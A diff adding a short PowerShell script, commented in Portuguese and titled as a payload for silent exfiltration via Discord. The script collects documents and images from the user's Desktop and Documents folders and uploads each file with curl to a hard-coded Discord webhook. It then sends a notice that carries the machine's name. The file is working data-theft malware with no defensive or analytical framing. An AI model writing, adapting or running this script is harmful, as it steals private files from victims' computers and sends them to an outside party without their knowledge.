@@ -1,0 +1,22 @@
+# PAYLOAD (.ps1) - Exfiltração Silenciosa via Discord
+$u = 'https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX'
+
+# Alvos baseados no script original (Documentos e Imagens)
+$e = @('*.pdf','*.doc','*.docx','*.txt','*.jpg','*.png')
+
+# Define pastas base (Ambiente de Trabalho e Documentos) para busca rápida (maxdepth 3)
+$paths = @([Environment]::GetFolderPath('Desktop'), [Environment]::GetFolderPath('MyDocuments'))
+
+foreach ($p in $paths) {
+    # Procura ficheiros com menos de 8MB nos primeiros 3 níveis de pastas
+    Get-ChildItem -Path $p -Include $e -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 8MB } | Select-Object -First 49 | ForEach-Object {
+        # Suporte a espaços no nome do ficheiro e upload via curl
+        $a = 'file=' + [char]64 + $_.FullName
+        curl.exe -k -s -F $a $u
+    }
+}
+
+# Notificação de conclusão
+curl.exe -k -s -F ('payload=' + [char]64 + 'Exfiltracao concluida no host: ' + $env:COMPUTERNAME) $u
+
+exit
